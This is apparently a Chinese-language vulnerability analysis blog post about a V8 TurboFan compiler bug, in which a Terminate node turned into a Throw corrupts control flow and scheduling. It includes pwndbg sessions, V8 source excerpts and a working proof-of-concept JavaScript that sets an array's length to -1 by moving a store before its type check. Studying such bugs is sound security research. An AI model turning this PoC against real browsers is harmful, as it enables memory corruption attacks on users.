<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">function opt() &#123;</span><br><span class="line">   var a = new Uint8Array(10);</span><br><span class="line">   a[0x100000000] = 2;</span><br><span class="line">   async function deadcode() &#123;</span><br><span class="line">      const obj = &#123;&#125;;</span><br><span class="line">      while (1) &#123;</span><br><span class="line">         if (badbeef + a + b + c*d) &#123;</span><br><span class="line">             while (obj) &#123;</span><br><span class="line">                await 666;</span><br><span class="line">                dead(beef);</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   deadcode();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (let i=0;i&lt;0x10000;i++) &#123;</span><br><span class="line">   opt();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/07/13/dRjEat5AueK6Jvh.png" alt="image.png"><br>这次在LOOP的输入节点路径上，由于IfValue不会被优化掉，因此整个路径就不会被优化去除。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/hi/Desktop/v8/src/compiler/dead-code-elimination.cc</span><br><span class="line">   108   DCHECK_EQ(inputs.count(), live_input_count);</span><br><span class="line">   109   return NoChange();</span><br><span class="line">   110 &#125;</span><br><span class="line">   111 </span><br><span class="line">   112 Reduction DeadCodeElimination::ReduceLoopOrMerge(Node* node) &#123;</span><br><span class="line"> ► 113   DCHECK(IrOpcode::IsMergeOpcode(node-&gt;opcode()));</span><br><span class="line">pwndbg&gt; p node-&gt;opcode()</span><br><span class="line">$217 = v8::internal::compiler::IrOpcode::kLoop</span><br><span class="line">pwndbg&gt; p node-&gt;id()</span><br><span class="line">$218 = 106</span><br><span class="line">pwndbg&gt; p node-&gt;inputs()[0]-&gt;opcode()</span><br><span class="line">$219 = v8::internal::compiler::IrOpcode::kJSCreateTypedArray</span><br><span class="line">pwndbg&gt; p node-&gt;inputs()[1]-&gt;opcode()</span><br><span class="line">$220 = v8::internal::compiler::IrOpcode::kIfFalse</span><br></pre></td></tr></table></figure>
<p>同时，在TypedLowering阶段可以看到漏洞也被触发了<br><img src="https://i.loli.net/2021/07/13/P63WDtLU1Fs9VmA.png" alt="image.png"><br>经过<code>EarlyOptimization</code>，多余的<code>Throw</code>也被去掉了，剩下两个Throw<br><img src="https://i.loli.net/2021/07/13/aRf7Sl8ucZQO2HK.png" alt="image.png"><br>而且可以看出，它们的effect连接着的上同一个节点<code>Unreachable</code>。</p>
<h3 id="修复后的情况"><a href="#修复后的情况" class="headerlink" title="修复后的情况"></a>修复后的情况</h3><p>首先了解一下Reduce过程中节点的遍历的顺序</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">void GraphReducer::ReduceGraph() &#123; ReduceNode(graph()-&gt;end()); &#125;</span><br><span class="line"></span><br><span class="line">void GraphReducer::ReduceNode(Node* node) &#123;</span><br><span class="line">  DCHECK(stack_.empty());</span><br><span class="line">  DCHECK(revisit_.empty());</span><br><span class="line">  Push(node);</span><br><span class="line">  for (;;) &#123;</span><br><span class="line">    if (!stack_.empty()) &#123;</span><br><span class="line">      // Process the node on the top of the stack, potentially pushing more or</span><br><span class="line">      // popping the node off the stack.</span><br><span class="line">      ReduceTop();</span><br><span class="line">    &#125; else if (!revisit_.empty()) &#123;</span><br><span class="line">      // If the stack becomes empty, revisit any nodes in the revisit queue.</span><br><span class="line">      Node* const node = revisit_.front();</span><br><span class="line">      revisit_.pop();</span><br><span class="line">      if (state_.Get(node) == State::kRevisit) &#123;</span><br><span class="line">        // state can change while in queue.</span><br><span class="line">        Push(node);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">..............</span><br><span class="line">void GraphReducer::ReduceTop() &#123;</span><br><span class="line">  NodeState&amp; entry = stack_.top();</span><br><span class="line">  Node* node = entry.node;</span><br><span class="line">  DCHECK_EQ(State::kOnStack, state_.Get(node));</span><br><span class="line"></span><br><span class="line">  if (node-&gt;IsDead()) return Pop();  // Node was killed while on stack.</span><br><span class="line"></span><br><span class="line">  Node::Inputs node_inputs = node-&gt;inputs();</span><br><span class="line"></span><br><span class="line">  // Recurse on an input if necessary.</span><br><span class="line">  int start = entry.input_index &lt; node_inputs.count() ? entry.input_index : 0;</span><br><span class="line">  for (int i = start; i &lt; node_inputs.count(); ++i) &#123;</span><br><span class="line">    Node* input = node_inputs[i];</span><br><span class="line">    if (input != node &amp;&amp; Recurse(input)) &#123;</span><br><span class="line">      entry.input_index = i + 1;</span><br><span class="line">      return;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  for (int i = 0; i &lt; start; ++i) &#123;</span><br><span class="line">    Node* input = node_inputs[i];</span><br><span class="line">    if (input != node &amp;&amp; Recurse(input)) &#123;</span><br><span class="line">      entry.input_index = i + 1;</span><br><span class="line">      return;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">....................</span><br></pre></td></tr></table></figure>
<p>从算法中可以看出，遍历是从End节点开始向上进行深度优先搜索进行遍历的，然后对于不同的节点，调用不同的Reduce方法进行Reduce。<br>这意味着LOOP节点比Terminate节点先进行Reduce，因为从End出发最左边开始必然有一条路径先到达LOOP<br><img src="https://i.loli.net/2021/08/02/XjfbxS1KoQEvq2D.png" alt="image.png"><br>前面分析过在<code>Reduction DeadCodeElimination::ReduceLoopOrMerge</code>函数中可能对Terminate节点进行消除</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#125; else if (live_input_count == 1) &#123;</span><br><span class="line">  NodeVector loop_exits(zone_);</span><br><span class="line">  // Due to compaction above, the live input is at offset 0.</span><br><span class="line">  for (Node* const use : node-&gt;uses()) &#123;</span><br><span class="line">    if (NodeProperties::IsPhi(use)) &#123;</span><br><span class="line">      Replace(use, use-&gt;InputAt(0));</span><br><span class="line">    &#125; else if (use-&gt;opcode() == IrOpcode::kLoopExit &amp;&amp;</span><br><span class="line">               use-&gt;InputAt(1) == node) &#123;</span><br><span class="line">      // Remember the loop exits so that we can mark their loop input dead.</span><br><span class="line">      // This has to be done after the use list iteration so that we do</span><br><span class="line">      // not mutate the use list while it is being iterated.</span><br><span class="line">      loop_exits.push_back(use);</span><br><span class="line">    &#125; else if (use-&gt;opcode() == IrOpcode::kTerminate) &#123;</span><br><span class="line">      DCHECK_EQ(IrOpcode::kLoop, node-&gt;opcode());</span><br><span class="line">      Replace(use, dead());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>第一次遍历到LOOP时，由于LOOP的两个inputs均有效，Terminate节点不会被优化掉。当所以节点遍历完毕以后，需要考虑那些需要<code>Revisit</code>的节点，从栈中依次将他们取出然后进行处理，而LOOP节点则会被遍历到，因为与LOOP节点相连接的父节点发生更新(83：Merge 、112::Phi)时，LOOP节点两次被加入Revisit。而此后，169:Branch节点的condition早已经经过<code>CommonOperatorReducer</code>，已经判断出条件为dead节点了，将使得下一次Visit时，在<code>DeadCodeElimination</code>中的<code>ReduceBranchOrSwitch</code>把169:Branch节点消除，这将使得LOOP的第二个输入变得无效，进而会把Terminate节点给消除掉。而原漏洞中，由于把Terminate节点替换为了Throw，那么在<code>ReduceLoopOrMerge</code>中就没有满足<code>use-&gt;opcode() == IrOpcode::kTerminate</code>条件，自然也就不会消除该节点。由此，该漏洞本质上是与LOOP配套的Terminate在LOOP被消除时以另一个名的形式仍然存在于源控制流的路径上，使得控制流混乱。<br>正常情况的流程如下，我们继续分析<br><img src="https://i.loli.net/2021/08/02/5rq3OgK98SvNYUG.png" alt="image.png"><br>在<code>EarlyOptimizationPhase</code>阶段会使用以下几个优化</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">struct EarlyOptimizationPhase &#123;</span><br><span class="line">  DECL_PIPELINE_PHASE_CONSTANTS(EarlyOptimization)</span><br><span class="line"></span><br><span class="line">  void Run(PipelineData* data, Zone* temp_zone) &#123;</span><br><span class="line">    GraphReducer graph_reducer(temp_zone, data-&gt;graph(),</span><br><span class="line">                               &amp;data-&gt;info()-&gt;tick_counter(),</span><br><span class="line">                               data-&gt;jsgraph()-&gt;Dead());</span><br><span class="line">    DeadCodeElimination dead_code_elimination(&amp;graph_reducer, data-&gt;graph(),</span><br><span class="line">                                              data-&gt;common(), temp_zone);</span><br><span class="line">    SimplifiedOperatorReducer simple_reducer(&amp;graph_reducer, data-&gt;jsgraph(),</span><br><span class="line">                                             data-&gt;broker());</span><br><span class="line">    RedundancyElimination redundancy_elimination(&amp;graph_reducer, temp_zone);</span><br><span class="line">    ValueNumberingReducer value_numbering(temp_zone, data-&gt;graph()-&gt;zone());</span><br><span class="line">    MachineOperatorReducer machine_reducer(&amp;graph_reducer, data-&gt;jsgraph());</span><br><span class="line">    CommonOperatorReducer common_reducer(&amp;graph_reducer, data-&gt;graph(),</span><br><span class="line">                                         data-&gt;broker(), data-&gt;common(),</span><br><span class="line">                                         data-&gt;machine(), temp_zone);</span><br><span class="line">    AddReducer(data, &amp;graph_reducer, &amp;dead_code_elimination);</span><br><span class="line">    AddReducer(data, &amp;graph_reducer, &amp;simple_reducer);</span><br><span class="line">    AddReducer(data, &amp;graph_reducer, &amp;redundancy_elimination);</span><br><span class="line">    AddReducer(data, &amp;graph_reducer, &amp;machine_reducer);</span><br><span class="line">    AddReducer(data, &amp;graph_reducer, &amp;common_reducer);</span><br><span class="line">    AddReducer(data, &amp;graph_reducer, &amp;value_numbering);</span><br><span class="line">    graph_reducer.ReduceGraph();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>其中114:Switch会在<code>CommonOperatorReducer</code>中的<code>ReduceSwitch</code>进行优化</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/hi/Desktop/v8/src/compiler/common-operator-reducer.cc</span><br><span class="line">   445       Node* if_value = projections[i];</span><br><span class="line">   446       DCHECK_EQ(IrOpcode::kIfValue, if_value-&gt;opcode());</span><br><span class="line">   447       const IfValueParameters&amp; p = IfValueParametersOf(if_value-&gt;op());</span><br><span class="line">   448       if (p.value() == mswitched.Value()) &#123;</span><br><span class="line">   449         matched = true;</span><br><span class="line"> ► 450         Replace(if_value, control);</span><br><span class="line">   451         break;</span><br><span class="line">   452       &#125;</span><br><span class="line">   453     &#125;</span><br><span class="line">pwndbg&gt; p control-&gt;id()</span><br><span class="line">$3 = 55</span><br><span class="line">pwndbg&gt; p control-&gt;opcode()</span><br><span class="line">$4 = v8::internal::compiler::IrOpcode::kCall</span><br><span class="line"></span><br><span class="line">................</span><br><span class="line">   454     if (!matched) &#123;</span><br><span class="line">   455       Node* if_default = projections[projection_count - 1];</span><br><span class="line">   456       DCHECK_EQ(IrOpcode::kIfDefault, if_default-&gt;opcode());</span><br><span class="line">   457       Replace(if_default, control);</span><br><span class="line">   458     &#125;</span><br><span class="line"> ► 459     return Replace(dead());</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这意味着分支预测成功，左分支被保留，同时114 Switch被置为Dead，那么与之相连接的其他节点会在<code>DeadCodeElimination</code>被去除，其中去除Throw的逻辑是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Reduction DeadCodeElimination::Reduce(Node* node) &#123;</span><br><span class="line">  DisallowHeapAccess no_heap_access;</span><br><span class="line">  switch (node-&gt;opcode()) &#123;</span><br><span class="line">.........................</span><br><span class="line">    case IrOpcode::kThrow:</span><br><span class="line">      return PropagateDeadControl(node);</span><br><span class="line">    case IrOpcode::kBranch:</span><br><span class="line">    case IrOpcode::kSwitch:</span><br><span class="line">      return ReduceBranchOrSwitch(node);</span><br><span class="line">    default:</span><br><span class="line">      return ReduceNode(node);</span><br><span class="line">  &#125;</span><br><span class="line">  UNREACHABLE();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最终的结果如图<br><img src="https://i.loli.net/2021/08/02/cCNisw6poam84Y3.png" alt="image.png"><br>而有漏洞的程序版本是这样的<br><img src="https://i.loli.net/2021/08/02/Y3DLMO1p2IjRUum.png" alt="image.png"><br>这是因为113：Throw并不属于那几个分支，不会被去掉。</p>
<h3 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h3><p>给出的POC如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">class classA &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    this.val = 0x4242;</span><br><span class="line">    this.x = 0;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class classB &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    this.val = 0x4141;</span><br><span class="line">    this.x = &quot;AAA&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var A = new classA();</span><br><span class="line">var B = new classB();</span><br><span class="line"></span><br><span class="line">function opt(arg1,arg2) &#123;</span><br><span class="line">   if (arg2 == 666) &#123;</span><br><span class="line">      return 666;</span><br><span class="line">   &#125;</span><br><span class="line">   var a = new Uint8Array(10);</span><br><span class="line">   arg1.val = -1;</span><br><span class="line">   a[0x100000000] = 2;</span><br><span class="line">   async function deadcode() &#123;</span><br><span class="line">      const obj = &#123;&#125;;</span><br><span class="line">      while (1) &#123;</span><br><span class="line">         if (badbeef + a + b + c*d) &#123;</span><br><span class="line">             while (obj) &#123;</span><br><span class="line">                await 666;</span><br><span class="line">                dead(beef);</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   deadcode();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (let i=0;i&lt;10000;i++) &#123;</span><br><span class="line">   opt(A,0);</span><br><span class="line">   opt(B,0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (let i=0;i&lt;5000;i++) &#123;</span><br><span class="line">   opt(A,666);</span><br><span class="line">   opt(B,666);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var arr = [1.1,2.2,3.3];</span><br><span class="line">opt(arr,0);</span><br><span class="line">print(arr.length);</span><br></pre></td></tr></table></figure>
<p>运行以后成功输出数组长度为-1，现在，我们来分析一下这个POC的原理<br>首先通过对比bug版本与nobug版本对于同一POC的输出数据，可以发现在<code>schedule</code>中的代码顺序有一些不一样。<br><img src="https://i.loli.net/2021/07/13/izfgV5F1UMGaxwI.png" alt="image.png"><br>其中的<code>arg1.val = -1;</code>所对应的中间代码理应归为基本块B7中，现在由于漏洞，使得其字节码归为了B4，而它的CheckMap的字节码被划分到B5，由于代码是按照顺序翻译下来并执行的，这就会导致<code>arg1.val = -1;</code>比arg1的类型检查先一步执行。<br><img src="https://i.loli.net/2021/07/13/podKcvOBQjkxhTL.png" alt="image.png"><br>现在来研究一下为什么会出现这种情况，首先在<code>Run&lt;ComputeSchedulePhase&gt;();</code>处下断点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b pipeline.cc:3032</span><br></pre></td></tr></table></figure>
<p>因为这个地方对应了流程中的schedule阶段，断点后跟进，最后会来到<code>Schedule* Scheduler::ComputeSchedule</code>函数，其位于<code>scheduler.cc</code>文件中，可以看出，这就是<code>schedule</code>的整个流程了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Schedule* Scheduler::ComputeSchedule(Zone* zone, Graph* graph, Flags flags,</span><br><span class="line">                                     TickCounter* tick_counter) &#123;</span><br><span class="line">  Zone* schedule_zone =</span><br><span class="line">      (flags &amp; Scheduler::kTempSchedule) ? zone : graph-&gt;zone();</span><br><span class="line"></span><br><span class="line">  // Reserve 10% more space for nodes if node splitting is enabled to try to</span><br><span class="line">  // avoid resizing the vector since that would triple its zone memory usage.</span><br><span class="line">  float node_hint_multiplier = (flags &amp; Scheduler::kSplitNodes) ? 1.1 : 1;</span><br><span class="line">  size_t node_count_hint = node_hint_multiplier * graph-&gt;NodeCount();</span><br><span class="line"></span><br><span class="line">  Schedule* schedule =</span><br><span class="line">      new (schedule_zone) Schedule(schedule_zone, node_count_hint);</span><br><span class="line">  Scheduler scheduler(zone, graph, schedule, flags, node_count_hint,</span><br><span class="line">                      tick_counter);</span><br><span class="line"></span><br><span class="line">  scheduler.BuildCFG();</span><br><span class="line">  scheduler.ComputeSpecialRPONumbering();</span><br><span class="line">  scheduler.GenerateDominatorTree();</span><br><span class="line"></span><br><span class="line">  scheduler.PrepareUses();</span><br><span class="line">  scheduler.ScheduleEarly();</span><br><span class="line">  scheduler.ScheduleLate();</span><br><span class="line"></span><br><span class="line">  scheduler.SealFinalSchedule();</span><br><span class="line"></span><br><span class="line">  return schedule;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输入图：<br><img src="https://i.loli.net/2021/07/13/jD3p2kwTAbxECzO.png" alt="image.png"><br>先是根据前面阶段优化好的IR图进行<code>BuildCFG</code>，生成控制流图。<br>其关键算法如下，从<code>End</code>节点开始自底向上广度优先搜索遍历</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">  void Run() &#123;</span><br><span class="line">    ResetDataStructures();</span><br><span class="line">    Queue(scheduler_-&gt;graph_-&gt;end());</span><br><span class="line"></span><br><span class="line">    while (!queue_.empty()) &#123;  // Breadth-first backwards traversal.</span><br><span class="line">      scheduler_-&gt;tick_counter_-&gt;DoTick();</span><br><span class="line">      Node* node = queue_.front();</span><br><span class="line">      queue_.pop();</span><br><span class="line">      int max = NodeProperties::PastControlIndex(node);</span><br><span class="line">      for (int i = NodeProperties::FirstControlIndex(node); i &lt; max; i++) &#123;</span><br><span class="line">        Queue(node-&gt;InputAt(i));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for (NodeVector::iterator i = control_.begin(); i != control_.end(); ++i) &#123;</span><br><span class="line">      ConnectBlocks(*i);  // Connect block to its predecessor/successors.</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">.............</span><br><span class="line">  void Queue(Node* node) &#123;</span><br><span class="line">    // Mark the connected control nodes as they are queued.</span><br><span class="line">    if (!queued_.Get(node)) &#123;</span><br><span class="line">      BuildBlocks(node);</span><br><span class="line">      queue_.push(node);</span><br><span class="line">      queued_.Set(node, true);</span><br><span class="line">      control_.push_back(node);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>当遍历到节点时，就调用<code>BuildBlocks</code>生成基本代码块，因此我们在BuildBlocks下断点，就可以观察其遍历节点的顺序以及操作。<br>当前遍历到End节点，使用<code>FixNode</code>将End节点添加到<code>schedule_-&gt;end()</code>这个<code>block</code>中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/hi/Desktop/v8/src/compiler/scheduler.cc</span><br><span class="line">   330       control_.push_back(node);</span><br><span class="line">   331     &#125;</span><br><span class="line">   332   &#125;</span><br><span class="line">   333 </span><br><span class="line">   334   void BuildBlocks(Node* node) &#123;</span><br><span class="line"> ► 335     switch (node-&gt;opcode()) &#123;</span><br><span class="line">   336       case IrOpcode::kEnd:</span><br><span class="line">   337         FixNode(schedule_-&gt;end(), node);</span><br><span class="line">   338         break;</span><br><span class="line">   339       case IrOpcode::kStart:</span><br><span class="line">   340         FixNode(schedule_-&gt;start(), node);</span><br><span class="line">pwndbg&gt; p node-&gt;opcode()</span><br><span class="line">$1 = v8::internal::compiler::IrOpcode::kEnd</span><br><span class="line">pwndbg&gt; p node-&gt;id()</span><br><span class="line">$2 = 60</span><br><span class="line"></span><br><span class="line">In file: /home/hi/Desktop/v8/src/compiler/scheduler.cc</span><br><span class="line">   315  private:</span><br><span class="line">   316   friend class ScheduleLateNodeVisitor;</span><br><span class="line">   317   friend class Scheduler;</span><br><span class="line">   318 </span><br><span class="line">   319   void FixNode(BasicBlock* block, Node* node) &#123;</span><br><span class="line"> ► 320     schedule_-&gt;AddNode(block, node);</span><br><span class="line">   321     scheduler_-&gt;UpdatePlacement(node, Scheduler::kFixed);</span><br><span class="line">   322   &#125;</span><br><span class="line">pwndbg&gt; p block-&gt;id()</span><br><span class="line">$4 = &#123;</span><br><span class="line">  index_ = 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>接下来遍历到End的第一个输入节点<code>30: Return</code>，可以知道Return节点不属于控制流的一部分，于是忽略，同理Throw也上一样。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/hi/Desktop/v8/src/compiler/scheduler.cc</span><br><span class="line">   362         if (NodeProperties::IsExceptionalCall(node)) &#123;</span><br><span class="line">   363           BuildBlocksForSuccessors(node);</span><br><span class="line">   364         &#125;</span><br><span class="line">   365         break;</span><br><span class="line">   366       default:</span><br><span class="line"> ► 367         break;</span><br><span class="line">pwndbg&gt; p node-&gt;id()</span><br><span class="line">$9 = 30</span><br><span class="line">pwndbg&gt; p node-&gt;opcode()</span><br><span class="line">$10 = v8::internal::compiler::IrOpcode::kReturn</span><br></pre></td></tr></table></figure>
<p>继续调试，后面不远处遍历到的节点是<code>73：Call</code>，显然这是借助了那个Terminate演变的Throw节点形成的一条路径遍历到此的，不然不可能这么快遍历到<code>73:Call</code><br><img src="https://i.loli.net/2021/07/13/28mTMuzfSCboZl6.png" alt="image.png"><br>接下来遍历到<code>23:Branch</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/hi/Desktop/v8/src/compiler/scheduler.cc</span><br><span class="line">   350         FixNode(block, node);</span><br><span class="line">   351         break;</span><br><span class="line">   352       &#125;</span><br><span class="line">   353       case IrOpcode::kBranch:</span><br><span class="line">   354       case IrOpcode::kSwitch:</span><br><span class="line"> ► 355         BuildBlocksForSuccessors(node);</span><br><span class="line">   356         break;</span><br><span class="line">pwndbg&gt; p node-&gt;id()</span><br><span class="line">$18 = 23</span><br><span class="line">pwndbg&gt; p node-&gt;opcode()</span><br><span class="line">$19 = v8::internal::compiler::IrOpcode::kBranch</span><br></pre></td></tr></table></figure>
